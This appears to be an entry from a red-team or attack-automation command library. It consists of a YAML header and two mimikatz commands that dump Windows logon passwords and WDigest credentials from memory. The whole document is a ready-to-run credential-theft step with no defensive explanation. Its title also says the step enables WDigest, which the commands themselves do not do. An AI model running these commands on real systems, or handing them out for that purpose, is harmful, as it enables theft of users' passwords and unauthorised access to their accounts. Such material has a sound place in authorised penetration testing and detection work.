---
id: 54d9ca97-7a68-4b0c-812b-8c85aa7b9b57
name: Extract Logon Passwords and Enable Wdigest
type: command
executor: bash
data: 'mimikatz_command -f sekurlsa::logonPasswords full

  mimikatz_command -f sekurlsa::wdigest

  '
output: null
created_at: '2023-04-06T03:56:27.124072+00:00'
updated_at: '2023-04-10T20:37:16.231490+00:00'
---

# Extract Logon Passwords and Enable Wdigest

```bash
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

```


